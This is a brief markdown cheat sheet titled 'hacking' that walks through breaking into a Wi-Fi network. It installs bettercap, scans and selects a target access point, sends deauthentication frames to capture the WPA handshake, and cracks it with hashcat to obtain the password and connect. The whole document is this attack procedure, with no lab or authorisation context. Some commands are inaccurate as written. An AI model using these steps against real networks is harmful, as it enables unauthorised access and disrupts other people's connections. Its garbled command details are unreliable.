## hacking
- `apt-get install bettercap`
> only first time

- run `bettercap` or `sudo bettercap -iface eth0` (wsl)
- turn on `net.probe on`
- show the adapters `net.show`
- connect `wifi.recon wlan0`
- show the wifis `wifi.show`
- set a wifi address `set wifi.ap bssid`
- break auth `wifi.deauth`
- get the handshake .pcap and unhash

- `apt-get install hashcat`
> only first time

- `hashcat file.pcap`
- get the password
- connect
